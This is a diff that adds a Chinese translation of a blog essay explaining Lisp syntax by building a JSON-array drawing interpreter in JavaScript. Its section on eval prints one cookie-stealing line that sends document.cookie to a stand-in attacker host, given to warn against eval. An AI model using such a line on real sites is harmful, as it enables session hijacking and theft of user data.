@@ -1,0 +1,742 @@
+#+title: 直观理解 Lisp 语法
+#+author: SouthFox
+#+date: 2025-12-19 14:18:20
+#+tags: Lisp:翻译
+
+#+begin_quote
+这篇文章是一个翻译！原文为： [[https://stopa.io/post/265][An Intuition for Lisp Syntax]]
+#+end_quote
+
+每个我遇到的 lisp 黑客（包括我），都觉得 lisp 里那些括号让人反感又奇怪，当然，只在一开始。很快我们就顿悟
+到了同一个事： lisp 的力量就在这些括号里！在这篇文章中，我们将踏上通往这条顿悟之路。
+
+,(read-more)
+
+** 绘画
+假设现在让你写程序画点东西。如果我们用 JavaScript 编写，那我们可能有这些函数：
+
+#+begin_src javascript
+drawPoint({x: 0, y: 1}, 'yellow')
+drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
+drawCircle(point, radius, 'red')
+rotate(shape, 90)
+...
+#+end_src
+
+目前为止还不错。
+
+** 挑战
+现在挑战来了：我们能支持远程绘图吗？
+
+这意味者用户可能会「发送」一些指令到你的屏幕上，然后让你看到他们的绘画过程。
+
+该怎么做呢？
+
+嗯，如果我们设置了一个 websocket 链接，我们可以像这样接收用户发送的指令：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  /* TODO */
+})
+#+end_src
+
+** Eval
+为了让它马上运作，一种方式是直接读取并运行输入进来的代码：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  eval(data)
+})
+#+end_src
+
+这样用户就可以发送 ="drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"= 之后就会嘣：画出一条线！
+
+但……你可能现在就脊背发凉了，如果恶意用户发送了这样的指令：
+
+#+begin_src javascript
+window.location='http://iwillp3wn.com?user_info=' + document.cookie
+#+end_src
+
+啊哦，我们的 cookie 会被发送到 iwillp3wn.com 然后我们就被黑了。我们不能用 eval ，太危险了。
+
+这就是问题所在：我们不能用 eval 但需要某种方式接受任意的指令。
+
+** 初步想法
+那么，我们可以用 JSON 来表示这些指令，将这些 JSON 映射到一个特殊的函数然后控制运行的内容。
+这是一种表现方式：
+
+#+begin_src javascript
+{
+  instructions: [
+    { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
+  ];
+}
+#+end_src
+
+这个 JSON 会被转换成 =drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")= 。
+
+实现这种转换也相当简单，我们的 onMessage 可能看起来像：
+
+#+begin_src javascript
+webSocket.onMessage(instruction => {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  data.instructions.forEach((ins) => fns[ins.functionName](...ins.args));
+})
+#+end_src
+
+看起来至少能用！
+
+** 初步简化
+让我们看看能不能更简洁一点，现在的 JOSN ：
+
+#+begin_src javascript
+{
+  instructions: [
+    { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
+  ];
+}
+#+end_src
+
+嗯，因为每个指令都有一个 functionName 和 args ，我们就不需要特别指明了，我们可以写成这样：
+
+#+begin_src javascript
+{
+  instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }, "blue"]],
+}
+#+end_src
+
+不错，我们将对象改成一个数组。然后为了处理这个还需要调整规则：指令的第一部分是函数名称，剩下的就都是参数。
+现在我们 onMessage 可能看起来像：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  data.instructions.forEach(([fName, ...args]) => fns[fName](...args));
+})
+#+end_src
+
+嘣，我们的 drawLine 又能用了！
+
+** 更多力量
+到目前为止我们用了 drawLine ：
+#+begin_src javascript
+drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
+// 相当于
+["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]
+#+end_src
+
+但我们如果想表达更有力的东西：
+
+#+begin_src javascript
+rotate(drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue'), 90)
+#+end_src
+
+看看这个，我们可以把这条指令转换成这样：
+
+#+begin_src javascript
+["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]
+#+end_src
+
+这里， rotate 指令的一个参数可以是指令！很强大，而且我们只需要稍微调整下我们的代码就能让它运行：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  const parseInstruction = (ins) => {
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  data.instructions.forEach(parseInstruction);
+})
+#+end_src
+
+很好，我们引入了一个 =parseInstruction= 函数。我们可以用 =parseInstruction= 递归处理参数，比如这样：
+
+#+begin_src javascript
+["rotate", ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90], 30]
+#+end_src
+
+非常酷！
+
+** 进一步简化
+好，再看看我们的 JSON ：
+
+#+begin_src javascript
+{
+  instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
+}
+#+end_src
+
+我们的数据只包含了 instructions ，但我们真得需要一个 =instructions= 的键吗？
+
+如果我们写成这样：
+
+#+begin_src javascript
+["do", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]
+#+end_src
+
+与其用一个顶层的键我们现在可以用一个叫 =do= 的特别指令来执行给出的指令。
+
+以下是一种实现方式：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  const fns = {
+    ...
+    do: (...args) => args[args.length - 1],
+  };
+  const parseInstruction = (ins) => {
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  parseInstruction(instruction);
+})
+#+end_src
+
+哦哇，真简单。我们只是为 =fns= 添加了 =do= 的定义，现在就能支持像这样的指令了：
+
+#+begin_src javascript
+[
+  "do",
+  ["drawPoint", { x: 0, y: 0 }],
+  ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]],
+];
+#+end_src
+
+** 更强大的力量
+让我们让它更有趣点，如果我们想要支持定义呢？
+
+#+begin_src javascript
+const shape = drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')
+rotate(shape, 90)
+#+end_src
+
+如果我们能够实现定义，远程用户就能写出非常有表现力的指令！让我们把代码转换成我们之前一直在用的数据形式：
+
+#+begin_src javascript
+["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]
+["rotate", "shape", 90]
+#+end_src
+
+不错！如果真能支持这样的指令就好了，现在：
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  const variables = {};
+  const fns = {
+    ...
+    def: (name, v) => {
+      variables[name] = v;
+    },
+  };
+  const parseInstruction = (ins) => {
+    if (variables[ins]) {
+      // 这里对应着变量例如 "shape"
+      return variables[ins];
+    }
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  parseInstruction(instruction);
+})
+#+end_src
+
+这儿我们引入了一个 =variables= 对象来跟踪每个我们定义的变量。一个叫 =def= 的函数会更新这个 =variables= 变量。
+现在我们可以运行像这样的指令：
+
+#+begin_src javascript
+[
+  "do",
+  ["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
+  ["rotate", "shape", 90],
+];
+#+end_src
+
+不错！
+
+** 推向极限：目标
+让我们更进一步，如果我们想让远程用户定义自己的函数呢？
+
+他们可能会写类似这样的东西：
+
+#+begin_src javascript
+const drawTriangle = function(left, top, right, color) {
+   drawLine(left, top, color);
+   drawLine(top, right, color);
+   drawLine(left, right, color);
+}
+drawTriangle(...)
+#+end_src
+
+我们要怎么做？让我们再次跟随直觉，将这些转换成我们的数据结构，看起来类似这样：
+
+#+begin_src javascript
+["def", "drawTriangle",
+  ["fn", ["left", "top", "right", "color"],
+    ["do",
+      ["drawLine", "left", "top", "color"],
+      ["drawLine", "top", "right", "color"],
+      ["drawLine", "left", "right", "color"],
+    ],
+  ],
+],
+["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
+#+end_src
+
+这里
+
+#+begin_src javascript
+const drawTriangle = ...
+#+end_src
+
+会转成
+
+#+begin_src javascript
+["def", "drawTriangle", …]
+#+end_src
+
+而且
+
+#+begin_src javascript
+function(left, top, right, color) {…}
+#+end_src
+
+会转成
+
+#+begin_src javascript
+["fn", ["left", "top", "right", "color"],
+["do" ...]]
+#+end_src
+
+我们需要以某种方式解析这些指令，然后，嘣，我们就能大功告成了！
+
+** 推向极限：关键
+实现上面关键在于 =["fn", …]= 指令，如果我们这样做：
+
+#+begin_src javascript
+const parseFnInstruction = (args, body, oldVariables) => {
+  return (...values) => {
+    const newVariables = {
+      ...oldVariables,
+      ...mapArgsWithValues(args, values),
+    };
+    return parseInstruction(body, newVariables);
+  };
+};
+#+end_src
+
+当我们找到 =fn= 指令时，我们会运行 =parseFnInstruction= 。这会产生一个新的 javascript 函数，
+并将 =drawTriangle= 替换成这样：
+
+#+begin_src javascript
+["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]
+#+end_src
+
+当函数运行时 =values= 将变成：
+
+#+begin_src javascript
+[{ x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]
+#+end_src
+
+之后
+
+#+begin_src javascript
+const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
+#+end_src
+
+会创建一个新的 =variables= 对象，包含函数参数和最新的映射值：
+
+#+begin_src javascript
+const newVariables = {
+  ...oldVariables,
+  left: { x: 0, y: 0 },
+  top: { x: 3, y: 3 },
+  right: {x: 6, y: 0 },
+  color: "blue",
+}
+#+end_src
+
+然后，我们可以去获取函数体，在这是：
+
+#+begin_src javascript
+      [
+        "do",
+        ["drawLine", "left", "top", "color"],
+        ["drawLine", "top", "right", "color"],
+        ["drawLine", "left", "right", "color"],
+      ],
+#+end_src
+
+这样 =parseInstruction= 在运行时就可以在 =newVariables= 里将 "left" 视作变量并获取到值 ={x: 0, y: 0}= 。
+
+如果我们做到了，函数功能的主要部分就完成了！
+
+** 推向极限：执行
+让我们回想一下计划，首先要做的事是得让 =parseInstruction= 接收 =variables= 作为一个参数。为此我们得
+先更新 =parseInstruction= ：
+
+#+begin_src javascript
+  const parseInstruction = (ins, variables) => {
+    ...
+    return fn(...args.map((arg) => parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);
+#+end_src
+
+接下来我们去检测这个 "fn" 指令：
+
+#+begin_src javascript
+  const parseInstruction = (ins, variables) => {
+    ...
+    const [fName, ...args] = ins;
+    if (fName == "fn") {
+      return parseFnInstruction(...args, variables);
+    }
+    ...
+    return fn(...args.map((arg) => parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);
+#+end_src
+
+现在，我们的 =parseFnInstruction= ：
+
+#+begin_src javascript
+const mapArgsWithValues = (args, values) => {
+  return args.reduce((res, k, idx) => {
+    res[k] = values[idx];
+    return res;
+  }, {});
+}
+const parseFnInstruction = (args, body, oldVariables) => {
+  return (...values) => {
+    const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
+    return parseInstruction(body, newVariables);
+  };
+};
+#+end_src
+
+就完全按照我们想的一样，当运行时返回一个新的函数：
+
+1. 创建一个新的 =newVariables= 对象，将 =args= 和 =values= 关联。
+2. 将 =body= 和新的 =variables= 传入 =parseInstruction= 运行。
+
+好的，差不多了。还差最后一点让一切跑起来：
+
+#+begin_src javascript
+  const parseInstruction = (ins, variables) => {
+    ...
+    const [fName, ...args] = ins;
+    if (fName == "fn") {
+      return parseFnInstruction(...args, variables);
+    }
+    const fn = fns[fName] || variables[fName];
+    return fn(...args.map((arg) => parseInstruction(arg, variables)));
+#+end_src
+
+秘密在于：
+
+#+begin_src javascript
+    const fn = fns[fName] || variables[fName];
+#+end_src
+
+这里由于 =fn= 现在可以同时来源于 =fns= 和 =variables= ，让我们同时支持两者，然后能用了！
+
+#+begin_src javascript
+websocket.onMessage(data => {
+  const variables = {};
+  const fns = {
+    drawLine: drawLine,
+    drawPoint: drawPoint,
+    rotate: rotate,
+    do: (...args) => args[args.length - 1],
+    def: (name, v) => {
+      variables[name] = v;
+    },
+  };
+  const mapArgsWithValues = (args, values) => {
+    return args.reduce((res, k, idx) => {
+      res[k] = values[idx];
+      return res;
+    }, {});
+  };
+  const parseFnInstruction = (args, body, oldVariables) => {
+    return (...values) => {
+      const newVariables = {
+        ...oldVariables,
+        ...mapArgsWithValues(args, values),
+      };
+      return parseInstruction(body, newVariables);
+    };
+  };
+  const parseInstruction = (ins, variables) => {
+    if (variables[ins]) {
+      // 这里就对应着变量例如 "shape"
+      return variables[ins];
+    }
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    if (fName == "fn") {
+      return parseFnInstruction(...args, variables);
+    }
+    const fn = fns[fName] || variables[fName];
+    return fn(...args.map((arg) => parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);
+})
+#+end_src
+
+天啊，就凭这些代码我们就能解析这些：
+
+#+begin_src javascript
+[
+  "do",
+  [
+    "def",
+    "drawTriangle",
+    [
+      "fn",
+      ["left", "top", "right", "color"],
+      [
+        "do",
+        ["drawLine", "left", "top", "color"],
+        ["drawLine", "top", "right", "color"],
+        ["drawLine", "left", "right", "color"],
+      ],
+    ],
+  ],
+  ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
+  ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
+])
+#+end_src
+
+我们可以组合函数、定义变量甚至创建自己的函数。仔细想想，我们刚刚相当于创建了一门新的编程语言！ [fn:1]
+
+** 试试看
+这是一个绘制三角形的例子 🙂
+
+[[https://jsfiddle.net/xn3tkdhL/3/][Edit fiddle - JSFiddle - Code Playground]]
+
+和一个快乐的小人的例子
+
+[[https://jsfiddle.net/xn3tkdhL/2/][Edit fiddle - JSFiddle - Code Playground]]
+
+** 惊喜
+我们甚至还能发现一些有趣的东西，我们新的编程语言比起 Javascript 还有一些优点！ 
+
+*** 没什么特别的
+在 Javascript 中，你通过写下 const x \= foo 来定义变量，如果你想重写 =const= 例如写成 =c= 是办不到的，
+因为 const x \= foo 是一个 Javascript 中的特殊语法，你无法改变它。
+
+但在我们的数组语言里，根本没什么语法！一切都只是数组。我们可以轻易写出特殊的类似 =def= 一样的 =c= 指令。 
+
+仔细想想看，在 Javascript 中我们类似于客人，我们得遵循语言设计者的规则。但在我们的数组语言里，我们是「共同所有者」，
+语言设计者的「内置」内容（例如 "def" "fn"）和我们写下的（例如 "drawTriangle"）没什么太大区别！
+
+*** 数据即代码
+还有一个更大的优点。我们的代码只是一大堆数组，所以我们能对这些代码做点事情，我们可以写生成代码的代码！
+
+例如，如果我们想在 Javascript 里支持 =unless= ：
+
+当有人写下
+
+#+begin_src javascript
+unless foo {
+   ...
+}
+#+end_src
+
+我们要将其重写成
+
+#+begin_src javascript
+if !foo {
+   ...
+}
+#+end_src
+
+这很难做到，可能需要类似 Babel 这类的工具解析文件确保能在 AST 之上将代码安全地重写成
+
+#+begin_src javascript
+if !foo {
+  ...
+}
+#+end_src
+
+但在我们的数组语言里，代码就是数组！很容易将其重写成 =unless= ：
+
+#+begin_src javascript
+function rewriteUnless(unlessCode) {
+   const [_unlessInstructionName, testCondition, consequent] = unlessCode; 
+   return ["if", ["not", testCondition], consequent]
+}
+#+end_src
+
+#+begin_src javascript
+rewriteUnless(["unless", ["=", 1, 1], ["drawLine"]])
+// =>
+["if", ["not", ["=", 1, 1]], ["drawLine"]];
+#+end_src
+
+天哪，小菜一碟。
+
+** 结构编辑
+用数据表示你的代码不仅让你容易操作你的代码也同时让你能够轻松编辑。例如
+假设现在你在编辑这段代码：
+
+#+begin_src javascript
+["if", testCondition, consequent]
+#+end_src
+
+你想把 =testCondition= 换成 =["not", testCondition]=
+
+你可以把光标移动到 =testCondition=
+
+#+begin_src javascript
+["if", |testCondition, consequent]
+#+end_src
+
+然后创建一个数组
+
+#+begin_src javascript
+["if", [|] testCondition, consequent]
+#+end_src
+
+然后键入 "not"
+
+#+begin_src javascript
+["if", ["not", |] testCondition, consequent]
+#+end_src
+
+如果你在用的编辑器理解这些数组，你可以告诉它：「拓展」这个数组到右边：
+
+#+begin_src javascript
+["if", ["not", testCondition], consequent]
+#+end_src
+
+嘣，你的编辑器就帮你修改了代码结构。
+
+如果你想撤销这个操作，你可以把光标移动到 =testCondition= 旁
+
+#+begin_src javascript
+["if", ["not", |testCondition], consequent]
+#+end_src
+
+并请编辑器「提升」一个层级：
+
+#+begin_src javascript
+["if", testCondition, consequent]
+#+end_src
+
+突然间，与其说是在编辑字符不说说是在操作代码结构。这就叫做结构编辑 [fn:2] 。这让你拥有陶艺家般的速度，这也是将代码
+当作数据的众多好处之一。
+
+** 你发现了什么
+嗯，我们写出的数组语言……只是一个实现不佳的 Lisp 方言！
+
+我们这个最复杂的例子：
+
+#+begin_src javascript
+[
+  "do",
+  [
+    "def",
+    "drawTriangle",
+    [
+      "fn",
+      ["left", "top", "right", "color"],
+      [
+        "do",
+        ["drawLine", "left", "top", "color"],
+        ["drawLine", "top", "right", "color"],
+        ["drawLine", "left", "right", "color"],
+      ],
+    ],
+  ],
+  ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
+  ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
+])
+#+end_src
+
+用 Clojure （另一种 lisp 方言）写出来是这样的：
+
+#+begin_src clojure
+(do
+  (def draw-triangle (fn [left top right color]
+                       (draw-line left top color)
+                       (draw-line top right color)
+                       (draw-line left right color)))
+  (draw-triangle {:x 0 :y 0} {:x 3 :y 3} {:x 6 :y 0} "blue")
+  (draw-triangle {:x 6 :y 6} {:x 10 :y 10} {:x 6 :y 16} "purple"))
+#+end_src
+
+表面上的区别在于：
+- 用 =()= 代替列表
+- 移除了所有逗号
+- 驼峰命名变成了短横线命名
+
+剩下的规则就差不多了：
+
+#+begin_src clojure
+(draw-line left top color)
+#+end_src
+
+意味者：
+- 对 =left=, =top=, =color= 求值，并用求出来的值替换它本身
+- 将这些值带入到 =draw-line= 这个函数并执行
+
+** 发现？
+现在如果我们认同操作源代码对我们很重要，那什么语言更方便让我们操作呢？
+
+换个说法说：如何让我们的代码像代码里的数据一样直观？一个想法很快就会浮现：让代码既是数据！
+多么激动的结论。如果我们关心操作源代码，那么一个自然而言的答案就是：代码既数据 [fn:3] 。
+
+如果代码即数据，那么我们可以用什么样的数据来表现？XML 可以，JSON 也可以，但如果我们往下找到最简单的数据结构
+会发生什么？这会导向最简单的嵌套结构……列表！
+
+这让人发人深省又激动人心。
+
+发人深省在于，感觉 Lisp 像是被「发现」的。像是什么最优化问题的解一样：如果你关心操作代码，
+你就会像发现万有引力一样发现 Lisp 。用一种发现出来的工具有点令人心生敬畏：或许某些天外生命就在用着 Lisp ！
+
+激动人心在于，可能有更好的语法在这，谁知道呢。Ruby 和 Python 是某种实验，尝试在没有括号的情况下带来类似 Lisp 般的力量。我
+觉得这个问题还没有解决。也许你，可以考虑一下。🙂
+
+** 结尾
+想象一下如果你能重写所用语言的代码，你的表现力会有多大。
+你将和语言设计师站在同一水平，而你在这一层级编写的抽象，累积起来能让你少走数年的弯路。。
+
+突然间，那些括号看起来挺酷的！
+
+** 脚注
+感谢 Daniel Woelfel, Alex Kotliarskyi, Sean Grove, Joe Averbuk, Irakli Safareli 对本文草稿的审阅
+
+[fn:1] 当然，我们也可以用它写 [[https://stopa.io/post/263][Y 组合子]] !
+
+[fn:2] Cursive 的文档里有一个[[https://cursive-ide.com/userguide/paredit.html][很棒的演示]] 。
+
+[fn:3] 例如 JavaScript 里 [[https://www.sweetjs.org/doc/tutorial.html#sweet-let][sweet.js]] 有在尝试支持宏。不过你可以看到在那里操作源代码仍然不如用代码当成数据来得直观。
+
+译按：另一篇对此文章的翻译： [[https://southerncross.github.io/blog/2020/11/an-intuition-for-list-syntax.html][【译】Lisp语法的直观解释 | Lishunyang's Blog]]
